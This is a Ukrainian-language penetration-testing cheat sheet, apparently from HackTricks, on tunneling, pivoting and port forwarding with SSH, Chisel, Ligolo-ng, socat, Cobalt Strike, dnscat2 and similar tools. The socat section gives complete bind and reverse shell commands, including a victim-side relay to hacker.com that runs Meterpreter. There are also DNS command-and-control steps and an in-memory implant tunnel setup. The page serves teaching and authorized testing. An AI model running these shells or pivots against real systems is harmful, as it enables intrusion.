# Тунелювання та перенаправлення портів

{{#include ../banners/hacktricks-training.md}}

## Порада Nmap

> [!WARNING]
> Підтримка proxy в Nmap обмежена TCP-з'єднаннями й не впливає на сканування ping, port або OS-detection. Коли сканер працює за SOCKS proxy, **вимкніть host discovery** (`-Pn`) і використовуйте **TCP connect scan** (`-sT`).<sup>[[5]](#references)</sup>

## **Bash**

**Host -> Jump -> InternalA -> InternalB**

Фінальна команда використовує опції `-u` та `-i` Evil-WinRM для ідентифікації облікового запису й хоста WinRM; його стандартний порт WinRM — 5985.<sup>[[4]](#references)</sup>
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

OpenSSH може перенаправляти X11-з'єднання, довільні TCP-порти та Unix-domain sockets через свій зашифрований канал.<sup>[[6]](#references)</sup>

Графічне SSH-з'єднання (X)

`-Y` вмикає trusted X11 forwarding, а `-C` запитує стиснення для перенаправлених даних.<sup>[[6]](#references)</sup>
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Remote Port2Port

Відкрити новий порт на SSH Server --> Інший порт

Віддалене перенаправлення (`-R`) прослуховує порт на SSH Server і підключається до локальної сторони; явна адреса прив’язки визначає, які інтерфейси можуть отримати доступ до цього слухача.<sup>[[6]](#references)</sup>
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Port2Port

Локальний порт --> Compromised host (SSH) --> Third_box:Port

Локальне (`-L`) forwarding прослуховує порт на клієнті та підключається до destination зі сторони SSH-сервера.<sup>[[6]](#references)</sup>
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

Локальний порт --> Скомпрометований хост (SSH) --> Куди завгодно

Dynamic (`-D`) forwarding створює локальний SOCKS4/SOCKS5 listener, підключення якого встановлюються з віддаленої сторони.<sup>[[6]](#references)</sup>
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### Multi-hop з ProxyJump

`-J`/`ProxyJump` підключається до цілі через один або кілька jump hosts, розділених комами. Параметри forwarding усе ще належать фінальному SSH-підключенню, тому наведений нижче SOCKS listener відкриває destinations з `internal-target`, а не з першого bastion. Це усуває потребу входити на jump host і запускати там другий SSH client.<sup>[[6]](#references)</sup>
```bash
# Reach the final SSH server through two bastions
ssh -J user1@jump1:22,user2@jump2:22 user3@internal-target

# Create a local SOCKS proxy whose connections exit from internal-target
ssh -J user1@jump1,user2@jump2 -N -D 127.0.0.1:1080 user3@internal-target
```
Параметри, специфічні для jump machines, слід розміщувати у `~/.ssh/config`; конфігурація командного рядка, призначена для destination, не застосовується автоматично до проміжних хостів.<sup>[[6]](#references)</sup>

### Reverse Port Forwarding

Це корисно для отримання reverse shells з внутрішніх хостів через DMZ на ваш хост:

Параметр сервера `GatewayPorts` визначає, чи може remote forward прив’язуватися за межами loopback; його значення за замовчуванням — `no`.<sup>[[7]](#references)</sup>
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tunnel

Цей приклад на основі root створює тунельні пристрої на обох хостах. Сервер має дозволяти tun forwarding, а вибраний обліковий запис повинен мати доступ до tun-пристрою; `PermitRootLogin yes` — один зі способів використати тут обліковий запис `root`.<sup>[[6]](#references)[[7]](#references)</sup>\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip link set tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ip link set tun0 up #Activate the server side network interface
```
Увімкнення forwarding на стороні сервера
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
Встановіть новий маршрут на стороні клієнта
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
> [!NOTE]
> **Безпека – Terrapin Attack (CVE-2023-48795)**
> OpenSSH 9.6 додав розширення strict-KEX для протидії атаці на цілісність раннього етапу транспорту Terrapin. За можливості оновіть обидва вузли та дотримуйтеся рекомендацій постачальника для старіших реалізацій, замість того щоб вважати, що forwarded channel захищений лише завдяки версії.<sup>[[8]](#references)</sup>

## SSHUTTLE

Ви можете **тунелювати** через **ssh** увесь **трафік** до **підмережі** через хост.\
Наприклад, перенаправляти весь трафік, що надходить до 10.10.10.0/24

`sshuttle` забезпечує прозоре проксіювання через SSH і підтримує вибір підмереж та власну SSH-команду, як показано нижче.<sup>[[9]](#references)</sup>
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
Підключитися за допомогою приватного ключа
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

`portfwd` у Metasploit підтримує локальне та віддалене перенаправлення, тоді як його SOCKS proxy module призначений для роботи з маршрутами сесії або `autoroute` і в цих прикладах за замовчуванням прослуховує порт 1080.<sup>[[10]](#references)[[11]](#references)[[12]](#references)</sup>

### Port2Port

Локальний порт --> Скомпрометований хост (активна сесія) --> Third_box:Port
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
### SOCKS
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
Ще один спосіб:
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

Beacon у Cobalt Strike може ретранслювати з'єднання SOCKS4a/SOCKS5 через Beacon; `rportfwd` прив'язує порт на скомпрометованому хості, тоді як `rportfwd_local` ініціює з'єднання з призначенням із клієнта Cobalt Strike.<sup>[[13]](#references)[[14]](#references)</sup>

### SOCKS proxy

Відкрийте порт у Team Server на інтерфейсах, які мають маршрутизувати трафік через Beacon.<sup>[[13]](#references)</sup>
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

> [!WARNING]
> У цьому випадку **порт відкривається на хості Beacon**, а трафік надсилається на Team Server, а звідти — до вказаного host:port.<sup>[[14]](#references)</sup>
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
Посібник із reverse-forwarding зазначає таку поведінку:<sup>[[14]](#references)</sup>

- Reverse port forward у Beacon призначений для **тунелювання трафіку до Team Server, а не для ретрансляції між окремими машинами**.
- Трафік **тунелюється всередині C2-трафіку Beacon**, включно з P2P-з’єднаннями.
- Високі порти зазвичай дають змогу уникнути обмежень привілейованих портів, але політика цільової ОС та наявні listeners усе одно застосовуються.

### rPort2Port local

> [!WARNING]
> У цьому випадку **порт відкривається на хості Beacon**, а не на Team Server, і **трафік надсилається клієнту Cobalt Strike** (а не на Team Server), а звідти — на вказаний host:port.<sup>[[14]](#references)</sup>
```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## BOFScale - CDN-fronted in-process tailnet

[BOFScale](https://github.com/NetSPI/BOFscale) запускає модифікований Tailscale overlay усередині Windows C2 implant без встановлення TUN driver або service. Його три компоненти - асинхронний CGo `c-shared` `tailscaled` BOF-PE, невеликий C++ BOF-PE, який взаємодіє з local API, та асинхронний TCP-to-SOCKS5 bridge `socksportfwd`.<sup>[[53]](#references)[[54]](#references)</sup>

### CDN-compatible TS2021 and DERP

Tailscale зазвичай використовує proprietary HTTP upgrades для control channel TS2021 на основі Noise та DERP relay. BOFScale зберігає ці byte streams, але передає їх через RFC 6455 WebSockets, використовуючи `Sec-WebSocket-Protocol: ts2021` або `derp`, завдяки чому контрольований оператором Headscale/DERP origin може працювати за CDN, який приймає лише стандартні WebSocket upgrades. Пропатчений client повторює TS2021 через WebSockets після HTTP `500`, повторює DERP після HTTP `426` та змушує DERP WebSocket dialer враховувати host proxy configuration; BOF встановлює `TS_DEBUG_DERP_WS_CLIENT=1`, щоб пропустити першу спробу, яка гарантовано завершується помилкою.<sup>[[53]](#references)[[54]](#references)</sup>

CDN та origin proxy повинні зберігати WebSocket upgrades для `/ts2021` і `/derp`, передавати `/key` як звичайний HTTP та вимкнути внутрішні read/write timeouts, оскільки relay sessions можуть залишатися відкритими необмежений час. Надана конфігурація Headscale вмикає `verify_clients`, публікує лише вбудовану оператором DERP map та залишає `derp.urls` порожнім, щоб запобігти fallback до relays, якими керує Tailscale.<sup>[[53]](#references)[[54]](#references)</sup>

### In-process daemon and named-pipe control

Якщо не задано інше, BOF entry point запускає `tailscaled` з параметрами `-tun=userspace-networking`, `-state mem:` та `-no-logs-no-support`, після чого створює pipe із назвою у форматі UUID. Він перенаправляє Go stdout/stderr через OS pipe до Beacon output API, тому весь daemon і Go runtime залишаються в пам'яті, але state та logs не записуються до Tailscale directory.<sup>[[53]](#references)[[54]](#references)</sup>

Lightweight client відтворює Tailscale HTTP/1.0 local API через цей pipe. Він відкриває pipe з параметрами `SECURITY_SQOS_PRESENT | SECURITY_IMPERSONATION`, оскільки `safesocket` layer daemon impersonates pipe client, надсилає `Tailscale-Cap: 125` та зіставляє local API з операціями `up`, `down`, `status`, route advertisement і shutdown.<sup>[[53]](#references)[[54]](#references)</sup>

> [!WARNING]
> Не вивантажуйте вручну mapped Go BOF-PE після надсилання daemon команди на shutdown: runtime та garbage-collector goroutines можуть продовжити виконання з пам'яті, яку loader unmaps. Запускайте `tailscaled` у sacrificial process і завершуйте цей process для остаточного очищення.<sup>[[54]](#references)</sup>

### Bridge host-originated traffic through userspace SOCKS5

Inbound tailnet connections та advertised subnet routes працюють усередині userspace network stack, але звичайні processes на compromised host не мають OS route до overlay. Тому `socksportfwd` прослуховує victim-facing TCP port, узгоджує SOCKS5 `NO AUTH` з daemon listener на `0.0.0.0:1080`, надсилає `CONNECT` для tailnet destination та асинхронно relay-ить трафік в обох напрямках. Якщо target є MagicDNS name, він використовує `ATYP_DOMAIN`, змушуючи `tailscaled` розв'язувати name без розкриття його Windows resolver.<sup>[[53]](#references)[[54]](#references)</sup>

Нижче показано мінімальний operator flow; і operator node, і implant повинні використовувати patched binaries, оскільки stock Tailscale не може пройти через цю CDN design.<sup>[[53]](#references)[[54]](#references)</sup>
```bash
HEADSCALE_HOSTNAME=<cdn-hostname> docker compose up
# Start tailscaled as an asynchronous BOF and copy its printed pipe name
tailscaled
tailscale --socket '\\.\pipe\<uuid>' up --auth-key <key> --login-server https://<cdn-hostname>
tailscale --socket '\\.\pipe\<uuid>' set --advertise-routes <victim-cidr>
socksportfwd --t <operator-magicdns-name> --tp 8888 --p 8888
```
Локальне перенаправлення може відокремити уявний authentication listener від relay tool: змусити машину пройти автентифікацію до прив’язаного порту compromised host, переспрямувати її через tailnet до `ntlmrelayx`, а потім виконати relay до AD CS, LDAP, HTTP, SMB або іншої сумісної цілі. Див. [WebDAV NTLM coercion](../windows-hardening/ntlm/places-to-steal-ntlm-creds.md#webdav-auth-coercion--credential-validation-via-davclntdlldavsetcookie) та [ESC8 relay to AD CS](../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints--esc8), щоб переглянути етапи, специфічні для вразливості; BOFScale відповідає лише за transport.<sup>[[54]](#references)</sup>

### Виявлення

Шукайте комбінацію ознак, а не один слабкий індикатор: Go runtime у процесі, який зазвичай не базується на Go, UUID pipe із permissive SDDL `D:(A;;GA;;;WD)`, неочікуваний SOCKS listener на `0.0.0.0:1080` і довготривалі TLS WebSockets до адрес CDN. За наявності TLS inspection позначайте `Sec-WebSocket-Protocol: derp` або `ts2021`, якщо процес-власник не є авторизованою службою `tailscaled`. Правила `bofscale.yar` у repository містять memory signatures для всіх трьох BOF-PE components.<sup>[[53]](#references)[[54]](#references)</sup>

## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

Проєкт надає web tunnel endpoints, як-от `tunnel.aspx`, `tunnel.ashx`, `tunnel.jsp` і `tunnel.php`; перед запуском локального proxy завантажте один із підтримуваних endpoints.<sup>[[15]](#references)</sup>
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

Завантажити його можна зі сторінки релізів [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
Chisel передає TCP/UDP-трафік через HTTP, використовуючи захищене SSH-з'єднання; використовуйте сумісні клієнтські/серверні збірки та перевіряйте синтаксис команд вибраного релізу.<sup>[[16]](#references)</sup>

### socks
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### Перенаправлення портів
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## wstunnel

[`wstunnel`](https://github.com/erebe/wstunnel) передає статичні або динамічні форварди через WebSocket, HTTP/2 або WebTransport (HTTP/3 поверх QUIC). Поточні збірки підтримують TCP, UDP, Unix-сокети, stdio, SOCKS5, проксування HTTP і listeners прозорого проксі в Linux в обох режимах: прямому та reverse.<sup>[[52]](#references)</sup>

### Reverse SOCKS5 pivot

Запустіть server на стороні атакувальника та змусьте pivot встановити вихідне з’єднання за допомогою `-R`. У цьому напрямку SOCKS5 listener створюється на **server**, тоді як запитані з’єднання виходять із мережі **client/pivot**.<sup>[[52]](#references)</sup>
```bash
# Attacker: use a certificate valid for pivot.example
wstunnel server --tls-certificate cert.pem --tls-private-key key.pem wss://0.0.0.0:443

# Pivot: expose an attacker-side, loopback-only SOCKS5 listener
wstunnel client --tls-verify-certificate \
-R 'socks5://127.0.0.1:1080' wss://pivot.example:443

# Attacker
proxychains nmap -n -Pn -sT -p 445,3389 10.10.10.0/24
```
Reverse static forward використовує той самий напрямок. Наприклад, він відкриває `10.10.10.20:445`, доступний через pivot, на loopback-порту атакувальної машини `8445`:<sup>[[52]](#references)</sup>
```bash
wstunnel client --tls-verify-certificate \
-R 'tcp://127.0.0.1:8445:10.10.10.20:445' wss://pivot.example:443
```
### Деталі вихідного трафіку та транспорту

- Додайте `-p http://user:pass@proxy:8080` до client, щоб пройти через явний HTTP proxy. Використовуйте `socks5h://127.0.0.1:1080` у таких clients, як `curl` (або увімкніть proxied DNS у застосунку), щоб внутрішні імена розв’язувалися за межами tunnel, а не витікали до локального resolver.<sup>[[52]](#references)</sup>
- `wss://` вибирає WebSocket із захистом TLS. client із `https://` вибирає HTTP/2, але buffering або перетворення на HTTP/1 reverse proxies/CDNs часто ламає двонапрямлений stream; під час тестування цього режиму відкривайте wstunnel server безпосередньо.<sup>[[52]](#references)</sup>
- `wts://` вибирає WebTransport поверх QUIC. Запустіть server із `--enable-webtransport` (або URL прослуховування `wts://`) і дозвольте UDP на порту прослуховування. Цей режим не може проходити через звичайний HTTP `CONNECT` proxy, оскільки такий proxy передає TCP.<sup>[[52]](#references)</sup>

> [!WARNING]
> Upstream project попереджає, що його вбудований self-signed certificate не слід вважати захистом приватності. Надавайте перевагу дійсному custom certificate разом із `--tls-verify-certificate` (або mTLS), залишайте proxy listeners на loopback, якщо віддалений доступ не є навмисним, і використовуйте вже захищені протоколи в tunnel, коли конфіденційність має значення.<sup>[[52]](#references)</sup>

## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

У quickstart Ligolo-ng описано TUN interface на proxy, перевірку certificate fingerprint для agent і налаштування route для tunneled network.<sup>[[17]](#references)</sup>

### Tunneling
```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```
### Прив’язування agent і прослуховування

Ligolo-ng може додавати прослуховувачі на agent, які перенаправляють трафік на адресу на стороні proxy, а його зарезервований діапазон `240.0.0.0/4` можна маршрутизувати для доступу до локальних сервісів agent.<sup>[[18]](#references)[[19]](#references)</sup>
```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```
### Доступ до локальних портів агента
```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Rpivot запускає reverse tunnel із боку жертви та відкриває SOCKS4 proxy на loopback-адресі атакуючого; у README також описано облікові дані та параметри хешів для NTLM-proxy.<sup>[[20]](#references)</sup>
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
Півот через **NTLM proxy**
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

Socat поєднує типи адрес, як-от `TCP-LISTEN`, `EXEC`, `SOCKS4A`, `OPENSSL` і `PROXY`; наведені нижче приклади комбінують ці задокументовані кінцеві точки.<sup>[[21]](#references)</sup>

### Bind shell
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### Reverse shell
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### Port2Port
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### Port2Port через socks
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### Meterpreter через SSL Socat
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
Ви можете пройти через **проксі без автентифікації** за допомогою задокументованого типу адреси `PROXY` у socat, виконавши цей рядок замість останнього в консолі жертви.<sup>[[21]](#references)</sup>
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL Socat Tunnel

**/bin/sh console**

Створіть сертифікати з обох боків: Client і Server
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Remote Port2Port

Підключити локальний SSH-порт (22) до порту 443 хоста атакуючого.
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

Plink — це інструмент PuTTY для підключення з командного рядка, з опціями SSH forwarding, подібними до `ssh`.<sup>[[22]](#references)</sup>

Для порту SSH використовуйте велику літеру `-P`. `-pw` збережено для сумісності, але цей параметр розкриває пароль у списку процесів; за можливості надавайте перевагу автентифікації за ключем або `-pwfile`.<sup>[[22]](#references)[[23]](#references)</sup>

Оскільки цей binary запускатиметься на victim і є SSH-клієнтом, відкрийте SSH service і порт для reverse connection; нижче використовується `-R` для перенаправлення локально доступного порту на машину attacker.<sup>[[22]](#references)</sup>
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-P <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-P 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Port2Port

Використовуйте контекст із дозволами, необхідними хосту, під час створення або зміни постійних правил `portproxy`. Microsoft документує наведені нижче форми `v4tov4` для додавання, перегляду та видалення.<sup>[[24]](#references)</sup>
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

Вам потрібно мати **RDP-доступ до системи**.\
Завантажте:

SocksOverRDP використовує Remote Desktop Dynamic Virtual Channels для передавання SOCKS5-з’єднання через наявну RDP-сесію; плагін клієнта прослуховує `127.0.0.1:1080`, тоді як серверний компонент працює на цілі RDP.<sup>[[25]](#references)</sup>

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Цей інструмент використовує `Dynamic Virtual Channels` (`DVC`) із функції Remote Desktop Service у Windows. DVC відповідає за **тунелювання пакетів через RDP-з’єднання**.
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

На вашому клієнтському комп’ютері завантажте **`SocksOverRDP-Plugin.dll`** так:
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
Тепер ми можемо **підключитися** до **жертви** через **RDP** за допомогою **`mstsc.exe`**, і повинні отримати **повідомлення** про те, що **плагін SocksOverRDP увімкнено**, і він **прослуховуватиме** **127.0.0.1:1080**.

**Підключіться** через **RDP** і завантажте та виконайте на машині жертви бінарний файл `SocksOverRDP-Server.exe`:
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
Тепер підтвердьте на своїй машині (attacker), що порт 1080 прослуховується:
```
netstat -antb | findstr 1080
```
Тепер можна використовувати [**Proxifier**](https://www.proxifier.com/), щоб проксувати трафік через цей порт.<sup>[[26]](#references)</sup>

## Проксування GUI-застосунків Windows

За допомогою [**Proxifier**](https://www.proxifier.com/) можна змусити GUI-застосунки Windows працювати через proxy.<sup>[[26]](#references)</sup>\
У **Profile -> Proxy Servers** додайте IP-адресу та порт SOCKS-сервера.\
У **Profile -> Proxification Rules** додайте назву програми, яку потрібно проксувати, і підключення до IP-адрес, які потрібно проксувати; правила Proxifier можуть зіставляти застосунки, цільові хости та порти.<sup>[[27]](#references)</sup>

## Тунелювання через NTLM proxy

Згаданий раніше інструмент **Rpivot** може ретранслювати трафік через proxy з автентифікацією NTLM. **OpenVPN** також може маршрутизувати трафік через нього, якщо налаштовано auth-файл і метод NTLMv2; це проходження через proxy, а не обхід автентифікації proxy.<sup>[[20]](#references)[[28]](#references)</sup>
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm2
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Cntlm автентифікується до upstream NTLM proxies, відкриває локальні listeners і може зіставити локальний tunnel port із destination service; після цього клієнти можуть використовувати цей локальний port.<sup>[[29]](#references)</sup>\
Наприклад, перенаправити port 443
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
Тепер, якщо, наприклад, налаштувати на victim сервіс **SSH** для прослуховування порту 443, можна підключитися до нього через порт 2222 на attacker.<sup>[[29]](#references)</sup>\
Також можна використати **meterpreter**, який підключається до localhost:443, тоді як attacker прослуховує порт 2222.<sup>[[29]](#references)</sup>

## YARP

YARP (Yet Another Reverse Proxy) — це .NET toolkit Microsoft для reverse-proxy. Його можна знайти тут: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy).<sup>[[30]](#references)</sup>

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

Iodine створює IPv4 tunnel через DNS-запити та використовує TUN-інтерфейси; задокументоване налаштування потребує привілеїв, необхідних для створення цих інтерфейсів на обох кінцях.<sup>[[31]](#references)</sup>
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
DNS-транспорт має більші накладні витрати, ніж прямий TCP, і зазвичай є повільним; ви можете створити стиснене SSH-з’єднання через цей тунель за допомогою:<sup>[[31]](#references)</sup>
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**Завантажте його звідси**](https://github.com/iagox86/dnscat2)**.**

Dnscat2 встановлює зашифрований канал command-and-control через DNS; наведені нижче команди сервера та клієнта відповідають його документованому використанню.<sup>[[32]](#references)</sup>
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **У PowerShell**

Ви можете використати [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell), щоб запустити клієнт dnscat2 у PowerShell; у його README описано параметри `Start-Dnscat2`, наведені нижче.<sup>[[33]](#references)</sup>
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **Перенаправлення портів за допомогою dnscat**

Інтерактивна команда `listen` у Dnscat2 зіставляє локальний listener із віддаленим хостом і портом.<sup>[[32]](#references)</sup>
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### Зміна DNS у proxychains

Proxychains-ng динамічно перехоплює TCP-з'єднання і не може передавати UDP або ICMP; проксування DNS налаштовується, тому перевірте встановлений `proxychains.conf` і helper для резолвінгу замість припущення про фіксований публічний резолвер. Legacy-скрипти `proxyresolv` надають змінну `PROXY_DNS_SERVER` для вибору резолвера; коли потрібні внутрішні імена, використовуйте резолвер, доступний із pivot.<sup>[[34]](#references)[[35]](#references)</sup>

## Тунелі на Go

